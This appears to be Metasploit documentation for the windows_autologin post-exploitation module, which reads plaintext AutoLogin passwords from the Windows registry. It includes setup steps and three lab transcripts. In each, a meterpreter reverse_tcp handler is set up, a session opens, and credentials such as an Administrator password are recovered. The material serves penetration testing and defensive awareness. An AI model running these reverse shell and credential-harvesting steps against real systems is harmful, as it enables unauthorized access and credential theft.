## Vulnerable Application

This module reads the registry keys associated with Microsoft Window's AutoLogin feature which keeps a
plaintext version of the password in the registry.

To turn on Windows Autologin feature, follow the instructions from
[Microsoft](https://support.microsoft.com/en-us/help/324737/how-to-turn-on-automatic-logon-in-windows).

1. Open registry editor (`regedit`) and navigate to: `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
1. Create the following `String Value`s
  1. `AutoAdminLogin` set to `1`
  1. `DefaultUserName` set to the username
  1. `DefaultPassword` set to the password
  1. Optional: `DefaultDomain` set to the domain

## Verification Steps

1. Configure autologin
1. Start msfconsole
1. get a shell on a vulnerable windows computer
1. Do: `use post/windows/gather/credentials/windows_autologin`
1. Do: `set session [#]`
1. Do: `run`
1. You should receive credentials.

## Options

## Scenarios

### Windows 2008 R2 (64-bit)

```
$ ./msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 10.0.2.4
lhost => 10.0.2.4
msf exploit(handler) > run

[*] Started reverse TCP handler on 10.0.2.4:4444 
[*] Starting the payload handler...
[*] Sending stage (1188415 bytes) to 10.0.2.11
[*] Meterpreter session 1 opened (10.0.2.4:4444 -> 10.0.2.11:49262) at 2017-07-22 11:59:22 -0500

meterpreter > background
[*] Backgrounding session 1...
msf exploit(handler) > use post/windows/gather/credentials/windows_autologin 
msf post(windows_autologin) > set session 1
session => 1
msf post(windows_autologin) > run

[*] Running against WIN-QPZJFHIS6PT on session 1
[+] AutoAdminLogon=1, DefaultDomain=mydomain, DefaultUser=Administrator, DefaultPassword=p@ssw0rd
[*] Post module execution completed
```

### Windows 2003

```
msf6 post(windows/gather/credentials/windows_autologin) > sessions -i 3
[*] Starting interaction with 3...

meterpreter > sysinfo
Computer        : WIN2003
OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > background
[*] Backgrounding session 3...
msf6 post(windows/gather/credentials/windows_autologin) > run

[*] Running against WIN2003 on session 3
[+] AutoAdminLogon=, DefaultDomain=WIN2003, DefaultUser=Administrator, DefaultPassword=TestPassword
[*] Post module execution completed
```

### Windows 7 (32-bit)

```
$ ./msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 10.0.2.4
lhost => 10.0.2.4
msf exploit(handler) > run

[*] Started reverse TCP handler on 10.0.2.4:4444 
[*] Starting the payload handler...
[*] Sending stage (956991 bytes) to 10.0.2.47
[*] Meterpreter session 1 opened (10.0.2.4:4444 -> 10.0.2.47:49215) at 2017-07-23 11:33:53 -0500

meterpreter > background
[*] Backgrounding session 1...
msf exploit(handler) > use post/windows/gather/credentials/windows_autologin 
msf post(windows_autologin) > set session 1
session => 1
msf post(windows_autologin) > run

[*] Running against IE8WIN7 on session 1
[+] AutoAdminLogon=1, DefaultDomain=IE8WIN7, DefaultUser=IEUser, DefaultPassword=
[*] Post module execution completed
```
